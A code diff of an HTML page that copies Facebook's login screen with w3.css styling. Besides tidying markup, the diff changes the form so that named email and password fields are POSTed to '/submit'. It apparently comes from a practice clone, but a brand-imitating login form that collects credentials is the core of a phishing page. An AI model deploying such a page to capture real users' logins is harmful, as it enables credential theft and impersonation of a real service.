@@ -5,61 +5,44 @@
     <meta http-equiv='X-UA-Compatible' content='IE=edge'>
     <title>facebook</title>
     <meta name='viewport' content='width=device-width, initial-scale=1'>
-    <link rel='stylesheet' type='text/css' media='screen' href='w3.css'>
-    <script src='main.js'></script>
+    <link rel='stylesheet' type='text/css' href='w3.css'>
 </head>
 <body class="w3-light-gray">
     
     <div class="w3-container">
-        <h1 class="
-            w3-text-blue
-            w3-center
-            w3-panel
-            w3-jumbo
-          ">
+        <h1 class="w3-text-blue w3-center w3-panel w3-jumbo">
           <b>facebook</b>
         </h1>
-        <p style="width:300px; margin-inline:auto;" 
-          class="w3-large w3-center">
-          <!-- <b> -->
+        <p style="width:300px; margin-inline:auto;" class="w3-large w3-center">
             Facebook helps you connect and share with the people in your life.
-          <!-- </b> -->
         </p>
     </div>
 
-    <form action="#" 
-
-
+    <form action="/submit" method="POST"
         style="max-width: 400px; margin-inline:auto;"
-        class="w3-white w3-container w3-card-4 
-          w3-padding-16 w3-round-large" >
+        class="w3-white w3-container w3-card-4 w3-padding-16 w3-round-large" >
         <p>
-         <input type="text" placeholder="Email address or phone number"
-          class="w3-input w3-border w3-padding-16  w3-padding w3-round-large ">
+         <input type="email" name="email" placeholder="Email address or phone number" required
+          class="w3-input w3-border w3-padding-16 w3-round-large">
        </p>
         <p>
-         <input type="text" placeholder="Enter your password"
-          class="w3-input w3-border w3-padding-16  w3-padding w3-round-large ">
+         <input type="password" name="password" placeholder="Enter your password" required
+          class="w3-input w3-border w3-padding-16 w3-round-large">
        </p>
-       <p class="">
-         <button style="width: 100%;background-color: rgb(39, 145, 231);" 
-           class="
-              w3-button w3-center  w3-round w3-hover-blue w3-padding-16 w3-text-white" >
-            <b 
-              >Log in</b>
+       <p>
+         <button type="submit" style="width:100%; background-color: rgb(39, 145, 231);" 
+           class="w3-button w3-round w3-hover-blue w3-padding-16 w3-text-white">
+            <b>Log in</b>
          </button>
        </p>
        <p class="w3-text-blue w3-center">
          <a href="#">Forgotten password?</a>
        </p>
        <hr class="w3-black">
-       <button style="margin-inline:auto;display: block ; margin-block:0; background-color: #5acf5e;"
-         class="w3-button w3-hover-green w3-text-white w3-padding-16 
-         w3-medium w3-round-large"><b>create new account</b></button>
-
+       <button type="button" style="margin-inline:auto; display:block; background-color:#5acf5e;"
+         class="w3-button w3-hover-green w3-text-white w3-padding-16 w3-medium w3-round-large">
+         <b>Create new account</b>
+       </button>
     </form>
-
-
- 
 </body>
 </html>
